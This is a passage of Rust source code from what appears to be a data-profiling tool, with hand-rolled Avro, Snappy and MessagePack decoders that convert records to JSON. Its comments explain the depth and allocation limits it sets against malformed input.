    /// `serde_json::Value` in the same pass - see this module's own
    /// top-of-file comment for why a two-pass decode-then-convert isn't
    /// needed here the way it is for the nested formats this project
    /// bridges through an intermediate dynamic value type. A `Union`'s own
    /// index is discarded once the matching variant is resolved, matching
    /// this project's old ciborium/apache-avro-based bridges' identical
    /// choice not to keep a "which variant" marker in the JSON output.
    fn decode_to_json<R: Read>(
        r: &mut R,
        schema: &Schema,
        names: &HashMap<String, Schema>,
    ) -> Result<JsonValue> {
        Ok(match schema {
            Schema::Null => JsonValue::Null,
            Schema::Boolean => match read_u8(r)? {
                0 => JsonValue::Bool(false),
                1 => JsonValue::Bool(true),
                other => bail!("invalid Avro boolean byte {other:#04x}"),
            },
            Schema::Int => JsonValue::from(i32::try_from(read_zigzag(r)?).unwrap_or(0)),
            Schema::Long => JsonValue::from(read_zigzag(r)?),
            Schema::Float => {
                let bytes = read_exact_vec(r, 4)?;
                let f = f32::from_le_bytes(bytes.try_into().unwrap());
                serde_json::Number::from_f64(f64::from(f))
                    .map_or(JsonValue::Null, JsonValue::Number)
            }
            Schema::Double => {
                let bytes = read_exact_vec(r, 8)?;
                let f = f64::from_le_bytes(bytes.try_into().unwrap());
                serde_json::Number::from_f64(f).map_or(JsonValue::Null, JsonValue::Number)
            }
            Schema::Bytes => {
                let b = read_length_prefixed(r)?;
                JsonValue::String(b.iter().map(|byte| format!("{byte:02x}")).collect())
            }
            Schema::String => {
                let b = read_length_prefixed(r)?;
                JsonValue::String(String::from_utf8(b).context("Avro string is not valid UTF-8")?)
            }
            Schema::Fixed(size) => {
                let b = read_exact_vec(r, *size)?;
                JsonValue::String(b.iter().map(|byte| format!("{byte:02x}")).collect())
            }
            Schema::Array(items) => {
                let mut out = Vec::new();
                loop {
                    let raw_count = read_zigzag(r)?;
                    let count = match raw_count.cmp(&0) {
                        std::cmp::Ordering::Equal => break,
                        std::cmp::Ordering::Less => {
                            let _byte_size = read_zigzag(r)?; // unused: we always decode, never skip
                            raw_count
                                .checked_neg()
                                .context("Avro array block count overflow")?
                        }
                        std::cmp::Ordering::Greater => raw_count,
                    };
                    for _ in 0..count {
                        out.push(decode_to_json(r, items, names)?);
                    }
                }
                JsonValue::Array(out)
            }
            Schema::Map(values) => {
                let mut out = serde_json::Map::new();
                loop {
                    let raw_count = read_zigzag(r)?;
                    let count = match raw_count.cmp(&0) {
                        std::cmp::Ordering::Equal => break,
                        std::cmp::Ordering::Less => {
                            let _byte_size = read_zigzag(r)?;
                            raw_count
                                .checked_neg()
                                .context("Avro map block count overflow")?
                        }
                        std::cmp::Ordering::Greater => raw_count,
                    };
                    for _ in 0..count {
                        let key = read_length_prefixed(r)?;
                        let key =
                            String::from_utf8(key).context("Avro map key is not valid UTF-8")?;
                        let value = decode_to_json(r, values, names)?;
                        out.insert(key, value);
                    }
                }
                JsonValue::Object(out)
            }
            Schema::Union(variants) => {
                let index = read_zigzag(r)?;
                let variant = usize::try_from(index)
                    .ok()
                    .and_then(|i| variants.get(i))
                    .with_context(|| format!("Avro union index {index} out of range"))?;
                decode_to_json(r, variant, names)?
            }
            Schema::Record(fields) => {
                let mut out = serde_json::Map::with_capacity(fields.len());
                for (name, field_schema) in fields {
                    let value = decode_to_json(r, field_schema, names)?;
                    out.insert(name.clone(), value);
                }
                JsonValue::Object(out)
            }
            Schema::Enum(symbols) => {
                let index = read_zigzag(r)?;
                let symbol = usize::try_from(index)
                    .ok()
                    .and_then(|i| symbols.get(i))
                    .with_context(|| format!("Avro enum index {index} out of range"))?;
                JsonValue::String(symbol.clone())
            }
            Schema::Decimal(inner, scale) => {
                let bytes = match inner.as_ref() {
                    Schema::Fixed(size) => read_exact_vec(r, *size)?,
                    Schema::Bytes => read_length_prefixed(r)?,
                    _ => unreachable!("Decimal only ever wraps Bytes or Fixed"),
                };
                JsonValue::String(bytes_to_decimal_string(&bytes, *scale as i64))
            }
            Schema::BigDecimal => JsonValue::String(decode_big_decimal(r)?),
            Schema::Uuid(kind) => {
                let bytes = match kind {
                    UuidKind::Str => {
                        let s = read_length_prefixed(r)?;
                        return Ok(JsonValue::String(
                            String::from_utf8(s).context("Avro UUID string is not valid UTF-8")?,
                        ));
                    }
                    UuidKind::Bytes => read_length_prefixed(r)?,
                    UuidKind::Fixed => read_exact_vec(r, 16)?,
                };
                JsonValue::String(
                    format_uuid_bytes(&bytes).context("Avro UUID value is not 16 bytes")?,
                )
            }
            Schema::Date => {
                let days = read_zigzag(r)?;
                EpochDate::from_days(days)
                    .map_or(JsonValue::Null, |d| JsonValue::String(d.format_ymd()))
            }
            Schema::TimeMillis => {
                let millis = i32::try_from(read_zigzag(r)?).unwrap_or(0);
                let secs = (millis.div_euclid(1000)).rem_euclid(86_400) as u32;
                let nanos = millis.rem_euclid(1000) as u32 * 1_000_000;
                EpochTime::from_seconds_since_midnight(secs, nanos)
                    .map_or(JsonValue::Null, |t| JsonValue::String(t.format_hms_frac(3)))
            }
            Schema::TimeMicros => {
                let micros = read_zigzag(r)?;
                let secs = (micros.div_euclid(1_000_000)).rem_euclid(86_400) as u32;
                let nanos = micros.rem_euclid(1_000_000) as u32 * 1000;
                EpochTime::from_seconds_since_midnight(secs, nanos)
                    .map_or(JsonValue::Null, |t| JsonValue::String(t.format_hms_frac(6)))
            }
            Schema::TimestampMillis | Schema::LocalTimestampMillis => {
                let millis = read_zigzag(r)?;
                EpochDateTime::from_unix_millis(millis)
                    .map_or(JsonValue::Null, |dt| JsonValue::String(dt.format_t_frac(3)))
            }
            Schema::TimestampMicros | Schema::LocalTimestampMicros => {
                let micros = read_zigzag(r)?;
                EpochDateTime::from_unix_micros(micros)
                    .map_or(JsonValue::Null, |dt| JsonValue::String(dt.format_t_frac(6)))
            }
            Schema::TimestampNanos | Schema::LocalTimestampNanos => {
                let nanos = read_zigzag(r)?;
                let secs = nanos.div_euclid(1_000_000_000);
                let subsec_nanos = nanos.rem_euclid(1_000_000_000) as u32;
                EpochDateTime::from_unix_seconds(secs, subsec_nanos)
                    .map_or(JsonValue::Null, |dt| JsonValue::String(dt.format_t_frac(9)))
            }
            Schema::Duration => {
                // Best-effort, matching this project's old apache-avro-based
                // bridge exactly: Duration (months, days, milliseconds - each
                // a raw u32 LE) has no single natural string form, so this
                // renders a disclosed placeholder rather than guessing at
                // one. See CLAUDE.md's "Not covered, and out of scope" note.
                let bytes = read_exact_vec(r, 12)?;
                let months = u32::from_le_bytes(bytes[0..4].try_into().unwrap());
                let days = u32::from_le_bytes(bytes[4..8].try_into().unwrap());
                let millis = u32::from_le_bytes(bytes[8..12].try_into().unwrap());
                JsonValue::String(format!(
                    "Duration {{ months: {months}, days: {days}, millis: {millis} }}"
                ))
            }
            Schema::Ref(name) => {
                let resolved = names
                    .get(name)
                    .with_context(|| format!("Avro schema references unknown name {name:?}"))?;
                decode_to_json(r, resolved, names)?
            }
        })
    }

    /// Hand-rolled decoder for Snappy's *raw* block format (not the
    /// higher-level "frame" format) - verified directly against the `snap`
    /// crate's own `decompress.rs`/`build.rs` (which generates its tag
    /// lookup table from the exact bit-layout rules this function encodes
    /// directly): a header varint (plain, not zigzagged) giving the total
    /// decompressed length, then a sequence of literal/copy elements. A
    /// tag byte's low 2 bits select the element: `00` is a literal (length
    /// in the top 6 bits, or - if that field is 60-63 - the real length
    /// minus one follows as 1-4 little-endian bytes); `01`/`10`/`11` are
    /// back-reference copies with a 1/2/4-byte offset respectively.
    fn snappy_decompress(input: &[u8]) -> Result<Vec<u8>> {
        let mut pos = 0usize;
        let mut shift = 0u32;
        let mut decompressed_len: u64 = 0;
        loop {
            let b = *input
                .get(pos)
                .context("truncated Snappy stream: missing length header")?;
            pos += 1;
            decompressed_len |= u64::from(b & 0x7F) << shift;
            if b & 0x80 == 0 {
                break;
            }
            shift += 7;
            if shift > 35 {
                bail!("malformed Snappy length header");
            }
        }
        let decompressed_len =
            usize::try_from(decompressed_len).context("Snappy decompressed length overflow")?;
        if decompressed_len > MAX_ALLOC {
            bail!("Snappy decompressed length {decompressed_len} exceeds the sanity cap");
        }

        let mut out = Vec::with_capacity(decompressed_len.min(MAX_ALLOC));
        while pos < input.len() {
            let tag = input[pos];
            pos += 1;
            match tag & 0x03 {
                0b00 => {
                    let mut len = usize::from(tag >> 2) + 1;
                    if len > 60 {
                        let n = len - 60;
                        if pos + n > input.len() {
                            bail!("truncated Snappy literal length");
                        }
                        let mut raw = 0u64;
                        for i in 0..n {
                            raw |= u64::from(input[pos + i]) << (8 * i);
                        }
                        pos += n;
                        len = usize::try_from(raw + 1).context("Snappy literal length overflow")?;
                    }
                    if pos + len > input.len() {
                        bail!("truncated Snappy literal");
                    }
                    out.extend_from_slice(&input[pos..pos + len]);
                    pos += len;
                }
                0b01 => {
                    let len = usize::from((tag >> 2) & 0x07) + 4;
                    let offset_hi = usize::from((tag >> 5) & 0x07);
                    let next = *input.get(pos).context("truncated Snappy copy offset")?;
                    pos += 1;
                    let offset = (offset_hi << 8) | usize::from(next);
                    copy_from_offset(&mut out, offset, len)?;
                }
                0b10 => {
                    let len = usize::from(tag >> 2) + 1;
                    if pos + 2 > input.len() {
                        bail!("truncated Snappy copy offset");
                    }
                    let offset = usize::from(input[pos]) | (usize::from(input[pos + 1]) << 8);
                    pos += 2;
                    copy_from_offset(&mut out, offset, len)?;
                }
                0b11 => {
                    let len = usize::from(tag >> 2) + 1;
                    if pos + 4 > input.len() {
                        bail!("truncated Snappy copy offset");
                    }
                    let offset = usize::from(input[pos])
                        | (usize::from(input[pos + 1]) << 8)
                        | (usize::from(input[pos + 2]) << 16)
                        | (usize::from(input[pos + 3]) << 24);
                    pos += 4;
                    copy_from_offset(&mut out, offset, len)?;
                }
                _ => unreachable!("2-bit tag"),
            }
        }
        if out.len() != decompressed_len {
            bail!(
                "Snappy stream decoded to {} bytes, header declared {decompressed_len}",
                out.len()
            );
        }
        Ok(out)
    }

    /// Appends `len` bytes to `out`, each copied from `offset` bytes
    /// before the current end - a back-reference that may legitimately
    /// overlap itself (e.g. offset 1, len 10 repeats the last byte 10
    /// times), so this must copy one byte at a time rather than via a
    /// single slice copy.
    fn copy_from_offset(out: &mut Vec<u8>, offset: usize, len: usize) -> Result<()> {
        if offset == 0 || offset > out.len() {
            bail!(
                "invalid Snappy back-reference offset {offset} at output length {}",
                out.len()
            );
        }
        let start = out.len() - offset;
        for i in 0..len {
            let byte = out[start + i];
            out.push(byte);
        }
        Ok(())
    }

    fn decompress_codec(codec: &str, data: Vec<u8>) -> Result<Vec<u8>> {
        match codec {
            "null" => Ok(data),
            "deflate" => inflate(&data[..]).context("failed to inflate an Avro deflate block"),
            "snappy" => {
                let data_end = data
                    .len()
                    .checked_sub(4)
                    .context("Avro snappy block is too short for its trailing CRC32")?;
                let decoded = snappy_decompress(&data[..data_end])?;
                let expected = u32::from_be_bytes(data[data_end..].try_into().unwrap());
                let actual = crc32(&decoded);
                if expected != actual {
                    bail!(
                        "Avro snappy block CRC32 mismatch: expected {expected:#010x}, got {actual:#010x}"
                    );
                }
                Ok(decoded)
            }
            "zstandard" => zstd_support::zstd_decompress(&data[..])
                .context("failed to decompress an Avro zstandard block"),
            other => bail!("Codec {other:?} is not supported/enabled"),
        }
    }

    /// Reads the Object Container File's metadata map (`avro.schema`,
    /// `avro.codec`, and any user metadata) - encoded the same way any
    /// other Avro `map<bytes>` value would be, just read directly here
    /// rather than bootstrapping the general `Schema`-driven decoder for
    /// this one, schema-less, always-known-shape case.
    fn read_metadata<R: Read>(r: &mut R) -> Result<HashMap<String, Vec<u8>>> {
        let mut out = HashMap::new();
        loop {
            let raw_count = read_zigzag(r)?;
            let count = match raw_count.cmp(&0) {
                std::cmp::Ordering::Equal => break,
                std::cmp::Ordering::Less => {
                    let _byte_size = read_zigzag(r)?;
                    raw_count
                        .checked_neg()
                        .context("Avro metadata block count overflow")?
                }
                std::cmp::Ordering::Greater => raw_count,
            };
            for _ in 0..count {
                let key = read_length_prefixed(r)?;
                let key = String::from_utf8(key).context("Avro metadata key is not valid UTF-8")?;
                let value = read_length_prefixed(r)?;
                out.insert(key, value);
            }
        }
        Ok(out)
    }

    pub(crate) fn columns_from_avro(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        use std::fs::File;
        use std::io::BufReader;

        let file = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
        let mut r = BufReader::new(file);

        expect_bytes(&mut r, b"Obj\x01")
            .with_context(|| format!("failed reading the header of {path:?}"))?;
        let metadata = read_metadata(&mut r)
            .with_context(|| format!("failed reading the header of {path:?}"))?;

        let schema_bytes = metadata
            .get("avro.schema")
            .with_context(|| format!("{path:?} has no avro.schema in its header"))?;
        let schema_json: JsonValue = serde_json::from_slice(schema_bytes)
            .with_context(|| format!("failed parsing the Avro schema in {path:?}"))?;
        let mut names: HashMap<String, Schema> = HashMap::new();
        let schema = parse_schema(&schema_json, &mut names, None)
            .with_context(|| format!("failed parsing the Avro schema in {path:?}"))?;

        let codec = metadata
            .get("avro.codec")
            .map(|b| String::from_utf8_lossy(b).into_owned())
            .unwrap_or_else(|| "null".to_string());

        let sync_marker = read_exact_vec(&mut r, 16)
            .with_context(|| format!("failed reading the header of {path:?}"))?;

        let mut values: Vec<JsonValue> = Vec::new();
        'blocks: while let Some(count) = try_read_zigzag(&mut r)
            .with_context(|| format!("failed reading a block from {path:?}"))?
        {
            let count = usize::try_from(count).context("invalid Avro block object count")?;
            let block_len = read_len(&mut r)?;
            let block_data = read_exact_vec(&mut r, block_len)
                .with_context(|| format!("failed reading a block from {path:?}"))?;
            let marker = read_exact_vec(&mut r, 16)
                .with_context(|| format!("failed reading a block from {path:?}"))?;
            if marker != sync_marker {
                bail!("{path:?}: a data block's sync marker doesn't match the header's");
            }
            let decompressed = decompress_codec(&codec, block_data)
                .with_context(|| format!("failed decompressing a block from {path:?}"))?;
            let mut cursor: &[u8] = &decompressed;
            for _ in 0..count {
                if nrows.is_some_and(|limit| values.len() >= limit) {
                    break 'blocks;
                }
                let value = decode_to_json(&mut cursor, &schema, &names)
                    .with_context(|| format!("failed decoding a record from {path:?}"))?;
                values.push(value);
            }
        }

        // Not every Avro file holds record-typed rows - an Avro RPC
        // response file, for instance, decodes to a bare scalar (found via
        // a real-world sweep against the Apache Avro project's own interop
        // test data: a "hello world" RPC response is just the string
        // "Hello, world!", not an object). The same fallback the
        // JSON/YAML/MessagePack/CBOR readers already use for their own
        // analogous case applies here too.
        if values.iter().all(JsonValue::is_object) {
            let records: Vec<serde_json::Map<String, JsonValue>> = values
                .into_iter()
                .map(|v| match v {
                    JsonValue::Object(m) => m,
                    _ => unreachable!("just checked every value is an object"),
                })
                .collect();
            Ok(profile_json_records(&records, n_samples))
        } else {
            let total = values.len();
            let refs: Vec<&JsonValue> = values.iter().filter(|v| !v.is_null()).collect();
            Ok(profile_json_path(
                "value".to_string(),
                total,
                refs,
                n_samples,
            ))
        }
    }
} // mod avro_support

#[cfg(feature = "avro")]
fn columns_from_avro_hand_rolled(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    avro_support::columns_from_avro(path, nrows, n_samples)
}

#[cfg(feature = "avro")]
fn columns_from_avro(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    columns_from_avro_hand_rolled(path, nrows, n_samples)
}

#[cfg(not(feature = "avro"))]
fn columns_from_avro(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "Avro support isn't compiled in - rebuild with `cargo build --release --features avro` (or --features full)"
    )
}

// --- MessagePack reader (opt-in via --features msgpack) ---
// Decodes each top-level value to serde_json::Value and reuses the exact
// same column-extraction/flattening path as JSON/Avro files. The decoder
// itself (`msgpack_support`) is hand-rolled - see CLAUDE.md's Dependency
// footprint section for why and how it was verified.

#[cfg(feature = "msgpack")]
mod msgpack_support {
    use super::*;

    /// A real, adversarial-testing-found bound, not an arbitrary round
    /// number - and deliberately *not* `rmpv::decode::MAX_DEPTH` (1024),
    /// which this project's own real-world testing found genuinely
    /// unsafe: a MessagePack-decoded `serde_json::Value` tree bypasses
    /// `serde_json`'s own parse-time recursion guard entirely (that guard
    /// only fires while parsing *text*, and this reader never produces
    /// any), so it's `profile_json_path`'s/this reader's own downstream
    /// recursive conversion that has to survive whatever depth is let
    /// through - and a debug build's much larger, uninlined stack frames
    /// were confirmed (not assumed) to overflow an 8MB thread stack
    /// somewhere between 700 and 900 levels, well under 1024, while an
    /// optimized release build survives 1024 comfortably. 256 matches
    /// `ciborium`'s own *default* recursion limit for CBOR - independent
    /// corroboration this is a real, known risk class for exactly this
    /// kind of recursive binary-format decoder, not specific to this
    /// project's own code (`ciborium`'s own doc comment: "Set a high
    /// recursion limit at your own risk (of stack exhaustion)!") - with
    /// comfortable margin under the empirically-found debug-build danger
    /// zone.
    const MAX_DEPTH: u32 = 256;

    /// A pre-allocation cap for a single string/binary value's buffer,
    /// matching `rmpv`'s own `read_bin_data` (see its own comment linking
    /// https://github.com/3Hren/msgpack-rust/issues/151) - a handful of
    /// bytes can otherwise claim an enormous length (`str32`/`bin32`'s
    /// length field is a full `u32`) and force a huge upfront allocation
    /// before a single byte of it has actually been read. Actual reads can
    /// still grow past this via `Read::take(len).read_to_end`, which only
    /// ever allocates as far as real bytes are actually available.
    const PREALLOC_MAX: usize = 64 * 1024;

    #[derive(Debug, Clone)]
    pub(crate) enum Value {
        Nil,
        Bool(bool),
        Int(i64),
        /// Only used for a genuine `uint64` value too large for `i64`
        /// (> `i64::MAX`) - every other integer marker fits `i64` and
        /// uses `Int` directly, mirroring `rmpv::Value::Integer`'s own
        /// `as_i64().or(as_u64())` fallback observed at every call site.
        UInt(u64),
        F32(f32),
        F64(f64),
        /// `Ok` for valid UTF-8 (the overwhelmingly common case); `Err`
        /// keeps the raw bytes for a string whose content isn't valid
        /// UTF-8 (legal MessagePack - `str` only promises bytes, not that
        /// they decode) so the caller can still render *something*
        /// (a hex dump, matching `rmpv::Utf8String`'s own lossless
        /// behavior) rather than lossily mangling or discarding it.
        Str(std::result::Result<String, Vec<u8>>),
        Bin(Vec<u8>),
        Array(Vec<Value>),
        Map(Vec<(Value, Value)>),
        Ext(i8, Vec<u8>),
    }

    fn read_bytes<const N: usize, R: std::io::Read>(r: &mut R) -> Result<[u8; N]> {
        let mut buf = [0u8; N];
        r.read_exact(&mut buf)
            .with_context(|| format!("truncated MessagePack stream: expected {N} more byte(s)"))?;
        Ok(buf)
    }

    fn read_u8<R: std::io::Read>(r: &mut R) -> Result<u8> {
        Ok(read_bytes::<1, _>(r)?[0])
    }
    fn read_i8<R: std::io::Read>(r: &mut R) -> Result<i8> {
        Ok(read_u8(r)? as i8)
    }
    fn read_u16<R: std::io::Read>(r: &mut R) -> Result<u16> {
        Ok(u16::from_be_bytes(read_bytes(r)?))
    }
    fn read_u32<R: std::io::Read>(r: &mut R) -> Result<u32> {
        Ok(u32::from_be_bytes(read_bytes(r)?))
    }
    fn read_u64<R: std::io::Read>(r: &mut R) -> Result<u64> {
        Ok(u64::from_be_bytes(read_bytes(r)?))
    }
    fn read_i16<R: std::io::Read>(r: &mut R) -> Result<i16> {
        Ok(i16::from_be_bytes(read_bytes(r)?))
    }
    fn read_i32<R: std::io::Read>(r: &mut R) -> Result<i32> {
        Ok(i32::from_be_bytes(read_bytes(r)?))
    }
    fn read_i64<R: std::io::Read>(r: &mut R) -> Result<i64> {
        Ok(i64::from_be_bytes(read_bytes(r)?))
    }
    fn read_f32<R: std::io::Read>(r: &mut R) -> Result<f32> {
        Ok(f32::from_be_bytes(read_bytes(r)?))
    }
    fn read_f64<R: std::io::Read>(r: &mut R) -> Result<f64> {
        Ok(f64::from_be_bytes(read_bytes(r)?))
    }

    fn read_bin<R: std::io::Read>(r: &mut R, len: usize) -> Result<Vec<u8>> {
        use std::io::Read;
        let mut buf = Vec::with_capacity(len.min(PREALLOC_MAX));
        let n = r
            .take(len as u64)
            .read_to_end(&mut buf)
            .context("failed reading MessagePack binary/string data")?;
        if n != len {
            bail!("truncated MessagePack stream: expected {len} byte(s), got {n}");
        }
        Ok(buf)
    }

    fn read_str<R: std::io::Read>(
        r: &mut R,
        len: usize,
    ) -> Result<std::result::Result<String, Vec<u8>>> {
        Ok(String::from_utf8(read_bin(r, len)?).map_err(|e| e.into_bytes()))
    }

    /// Reads one MessagePack-encoded value (RFC-less but a stable, widely
    /// implemented format - msgpack.org's own spec - verified directly
    /// against the `rmp` crate's `marker.rs` byte-range table, the
    /// authoritative source for the whole wire format, rather than
    /// recalled from memory). `depth` is a remaining-recursion budget,
    /// not a running total - it only ever counts down, and hitting zero
    /// mid-array/mid-map is a clean, actionable error rather than a stack
    /// overflow, the same contract every other nested format in this
    /// project already gives adversarially deep input.
    fn read_value<R: std::io::Read>(r: &mut R, depth: u32) -> Result<Value> {
        if depth == 0 {
            bail!("malformed MessagePack stream: nested more than {MAX_DEPTH} levels deep");
        }
        let marker = read_u8(r)?;
        Ok(match marker {
            0x00..=0x7f => Value::Int(marker as i64),
            0x80..=0x8f => Value::Map(read_map(r, (marker & 0x0f) as usize, depth - 1)?),
            0x90..=0x9f => Value::Array(read_array(r, (marker & 0x0f) as usize, depth - 1)?),
            0xa0..=0xbf => Value::Str(read_str(r, (marker & 0x1f) as usize)?),
            0xc0 => Value::Nil,
            // 0xc1 is marked "never used" in the spec itself; rmpv treats
            // an encounter as Nil rather than a hard error, and this
            // reader matches that leniency rather than introducing a
            // behavior difference for a byte no real encoder emits.
            0xc1 => Value::Nil,
            0xc2 => Value::Bool(false),
            0xc3 => Value::Bool(true),
            0xc4 => {
                let len = read_u8(r)? as usize;
                Value::Bin(read_bin(r, len)?)
            }
            0xc5 => {
                let len = read_u16(r)? as usize;
                Value::Bin(read_bin(r, len)?)
            }
            0xc6 => {
                let len = read_u32(r)? as usize;
                Value::Bin(read_bin(r, len)?)
            }
            0xc7 => {
                let len = read_u8(r)? as usize;
                let ty = read_i8(r)?;
                Value::Ext(ty, read_bin(r, len)?)
            }
            0xc8 => {
                let len = read_u16(r)? as usize;
                let ty = read_i8(r)?;
                Value::Ext(ty, read_bin(r, len)?)
            }
            0xc9 => {
                let len = read_u32(r)? as usize;
                let ty = read_i8(r)?;
                Value::Ext(ty, read_bin(r, len)?)
            }
            0xca => Value::F32(read_f32(r)?),
            0xcb => Value::F64(read_f64(r)?),
            0xcc => Value::Int(read_u8(r)? as i64),
            0xcd => Value::Int(read_u16(r)? as i64),
            0xce => Value::Int(read_u32(r)? as i64),
            0xcf => {
                let v = read_u64(r)?;
                if v <= i64::MAX as u64 {
                    Value::Int(v as i64)
                } else {
                    Value::UInt(v)
                }
            }
            0xd0 => Value::Int(read_i8(r)? as i64),
            0xd1 => Value::Int(read_i16(r)? as i64),
            0xd2 => Value::Int(read_i32(r)? as i64),
            0xd3 => Value::Int(read_i64(r)?),
            0xd4 => {
                let ty = read_i8(r)?;
                Value::Ext(ty, read_bin(r, 1)?)
            }
            0xd5 => {
                let ty = read_i8(r)?;
                Value::Ext(ty, read_bin(r, 2)?)
            }
            0xd6 => {
                let ty = read_i8(r)?;
                Value::Ext(ty, read_bin(r, 4)?)
            }
            0xd7 => {
                let ty = read_i8(r)?;
                Value::Ext(ty, read_bin(r, 8)?)
            }
            0xd8 => {
                let ty = read_i8(r)?;
                Value::Ext(ty, read_bin(r, 16)?)
            }
            0xd9 => {
                let len = read_u8(r)? as usize;
                Value::Str(read_str(r, len)?)
            }
            0xda => {
                let len = read_u16(r)? as usize;
                Value::Str(read_str(r, len)?)
            }
            0xdb => {
                let len = read_u32(r)? as usize;
                Value::Str(read_str(r, len)?)
            }
            0xdc => {
                let len = read_u16(r)? as usize;
                Value::Array(read_array(r, len, depth - 1)?)
            }
            0xdd => {
                let len = read_u32(r)? as usize;
                Value::Array(read_array(r, len, depth - 1)?)
            }
            0xde => {
                let len = read_u16(r)? as usize;
                Value::Map(read_map(r, len, depth - 1)?)
            }
            0xdf => {
                let len = read_u32(r)? as usize;
                Value::Map(read_map(r, len, depth - 1)?)
            }
            0xe0..=0xff => Value::Int(marker as i8 as i64),
        })
    }

    /// Deliberately builds the `Vec` incrementally (`Vec::new()` +
    /// `.push()` per element) rather than `(0..len).map(...).collect()`,
    /// which would let `len` - read directly from the untrusted stream,
    /// up to a full `u32` for `array32`/`map32` - size an eager
    /// allocation before a single element has actually been read. This
    /// is a real, previously-found issue in this exact ecosystem, not a
    /// theoretical one: `rmpv`'s own `read_array_data`/`read_map_data`
    /// carry the identical fix with a comment linking
    /// <https://github.com/3Hren/msgpack-rust/issues/151>, found and
    /// checked directly rather than assumed safe by default. A stream
    /// that can't actually supply `len` real elements fails via
    /// `read_value`'s own `read_exact` long before the `Vec` grows
    /// anywhere near `len` in size.
    fn read_array<R: std::io::Read>(r: &mut R, len: usize, depth: u32) -> Result<Vec<Value>> {
        let mut out = Vec::new();
        for _ in 0..len {
            out.push(read_value(r, depth)?);
        }
        Ok(out)
    }

    fn read_map<R: std::io::Read>(
        r: &mut R,
        len: usize,
        depth: u32,
    ) -> Result<Vec<(Value, Value)>> {
        let mut out = Vec::new();
        for _ in 0..len {
            out.push((read_value(r, depth)?, read_value(r, depth)?));
        }
        Ok(out)
    }

    fn key_to_string(k: &Value) -> String {
        if let Value::Str(Ok(s)) = k {
            return s.clone();
        }
        value_to_json(k).to_string()
    }

    fn value_to_json(v: &Value) -> JsonValue {
        match v {
            Value::Nil => JsonValue::Null,
            Value::Bool(b) => JsonValue::Bool(*b),
            Value::Int(i) => JsonValue::from(*i),
            Value::UInt(u) => JsonValue::from(*u),
            Value::F32(f) => serde_json::Number::from_f64(f64::from(*f))
                .map_or(JsonValue::Null, JsonValue::Number),
            Value::F64(f) => {
                serde_json::Number::from_f64(*f).map_or(JsonValue::Null, JsonValue::Number)
            }
            Value::Str(Ok(s)) => JsonValue::String(s.clone()),
            Value::Str(Err(bytes)) => {
                JsonValue::String(bytes.iter().map(|b| format!("{b:02x}")).collect())
            }
            Value::Bin(b) => {
                JsonValue::String(b.iter().map(|byte| format!("{byte:02x}")).collect())
            }
            Value::Array(items) => JsonValue::Array(items.iter().map(value_to_json).collect()),
            Value::Map(pairs) => JsonValue::Object(
                pairs
                    .iter()
                    .map(|(k, v)| (key_to_string(k), value_to_json(v)))
                    .collect(),
            ),
            Value::Ext(kind, data) => {
                JsonValue::String(format!("ext({kind}, {} bytes)", data.len()))
            }
        }
    }

    /// Reads a stream of top-level MessagePack values (each value is
    /// self-delimiting, so records can just be concatenated back-to-back
    /// in the file - the common convention for a MessagePack *data* file,
    /// as opposed to a single MessagePack-encoded document). If the file
    /// holds exactly one top-level value and it's an array, that array's
    /// elements are treated as the records instead, mirroring how the
    /// JSON reader treats a single top-level `[...]` array.
    pub(crate) fn columns_from_msgpack(
        path: &Path,
        nrows: Option<usize>,
        n_samples: usize,
    ) -> Result<Vec<ColumnProfile>> {
        use std::fs::File;
        use std::io::BufRead;
        use std::io::BufReader;

        let file = File::open(path).with_context(|| format!("failed to open {path:?}"))?;
        let mut reader = BufReader::new(file);

        let mut top_values = Vec::new();
        while !reader
            .fill_buf()
            .with_context(|| format!("failed reading {path:?}"))?
            .is_empty()
        {
            let v = read_value(&mut reader, MAX_DEPTH)
                .with_context(|| format!("failed decoding a MessagePack value from {path:?}"))?;
            top_values.push(v);
        }

        let values: Vec<Value> = if top_values.len() == 1 {
            match top_values.into_iter().next().unwrap() {
                Value::Array(items) => items,
                other => vec![other],
            }
        } else {
            top_values
        };

        let mut values: Vec<JsonValue> = values.iter().map(value_to_json).collect();
        if let Some(n) = nrows {
            values.truncate(n);
        }

        // Not every MessagePack stream holds map-typed records - a stream of
        // bare scalars (e.g. IoT/telemetry readings, a real, common shape for
        // this format specifically because it's compact binary encoding) has
        // no field names to extract, but is still a genuine single column.
        // Same fallback the JSON/YAML/Avro readers already use for their own
        // analogous case, found the same way: real-world testing.
        if values.iter().all(JsonValue::is_object) {
            let records: Vec<serde_json::Map<String, JsonValue>> = values
                .into_iter()
                .map(|v| match v {
                    JsonValue::Object(m) => m,
                    _ => unreachable!("just checked every value is an object"),
                })
                .collect();
            Ok(profile_json_records(&records, n_samples))
        } else {
            let total = values.len();
            let refs: Vec<&JsonValue> = values.iter().filter(|v| !v.is_null()).collect();
            Ok(profile_json_path(
                "value".to_string(),
                total,
                refs,
                n_samples,
            ))
        }
    }
} // mod msgpack_support

#[cfg(feature = "msgpack")]
fn columns_from_msgpack(
    path: &Path,
    nrows: Option<usize>,
    n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    msgpack_support::columns_from_msgpack(path, nrows, n_samples)
}

#[cfg(not(feature = "msgpack"))]
fn columns_from_msgpack(
    _path: &Path,
    _nrows: Option<usize>,
    _n_samples: usize,
) -> Result<Vec<ColumnProfile>> {
    bail!(
        "MessagePack support isn't compiled in - rebuild with `cargo build --release --features msgpack` (or --features full)"
    )
}
// --- TOML reader (opt-in via --features toml, hand-rolled - see
// `toml_support` below and CLAUDE.md's Dependency footprint section) ---
// A TOML file is a single document, not inherently a table of many rows -
// unlike every other reader in this file, there's no natural "row" to
// repeat. Rather than invent a fake row count, the whole document is
// profiled as one record via profile_json_records (total = 1), so an
// array-of-tables section (`[[servers]]`) becomes a `Vec<object>` column
// that flattens exactly like any other JSON array of objects would.

#[cfg(feature = "toml")]
mod toml_support {
    use super::*;

    // -----------------------------------------------------------------
    // Document tree with definedness tracking. The recursive *value*
    // grammar (strings/numbers/arrays/inline tables) needs none of this -
    // it bridges straight to `serde_json::Value`, same as every other
    // hand-rolled nested-format reader in this project. Only the
